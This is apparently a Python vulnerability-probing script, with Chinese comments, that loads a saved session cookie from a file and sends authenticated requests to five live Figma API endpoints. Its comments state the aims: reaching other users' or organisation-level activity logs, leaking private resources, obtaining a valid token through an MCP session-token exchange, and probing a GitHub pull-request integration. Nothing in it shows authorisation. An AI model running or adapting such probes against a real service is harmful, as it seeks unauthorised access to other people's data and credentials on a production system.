# -*- coding: utf-8 -*-
# 高级漏洞候选: activity_logs / resources / mcp session_token_exchange / github create_pull_request
import io, sys, json
import urllib.request, urllib.error
sys.stdout.reconfigure(encoding='utf-8', errors='replace')
rawB=io.open('ws_cookie_B_new.txt',encoding='utf-8').read().strip().replace('\n','; ')
def call(url, method='GET', body=None, cookie=None):
    h={'Cookie':cookie or rawB,'User-Agent':'Mozilla/5.0','accept':'application/json,text/plain,*/*','content-type':'application/json',
       'Origin':'https://www.figma.com','Referer':'https://www.figma.com/files'}
    req=urllib.request.Request(url, method=method, headers=h)
    if body is not None: req.data=json.dumps(body).encode()
    try:
        r=urllib.request.urlopen(req, timeout=25)
        return r.status, r.read().decode('utf-8',errors='replace')[:350]
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode('utf-8',errors='replace')[:350]
    except Exception as e:
        return 'ERR', str(e)[:120]

print('== [1] GET /api/activity_logs (目标: 他人活动/组织级数据)')
st,b=call('https://www.figma.com/api/activity_logs')
print(f'  {st} {b}')

print('== [2] GET /api/activity_logs/recent/')
st,b=call('https://www.figma.com/api/activity_logs/recent/')
print(f'  {st} {b}')

print('== [3] POST /api/resources/by_content_ids_and_types (目标: 私有资源泄露)')
st,b=call('https://www.figma.com/api/resources/by_content_ids_and_types','POST',{"content_ids":[],"content_type":"file"})
print(f'  {st} {b}')

print('== [4] POST /api/mcp/session_token_exchange (目标: 换出有效token)')
st,b=call('https://www.figma.com/api/mcp/session_token_exchange','POST',{})
print(f'  {st} {b}')

print('== [5] POST /api/integrations/github-app/create_pull_request (目标: 400契约)')
st,b=call('https://www.figma.com/api/integrations/github-app/create_pull_request','POST',{})
print(f'  {st} {b}')
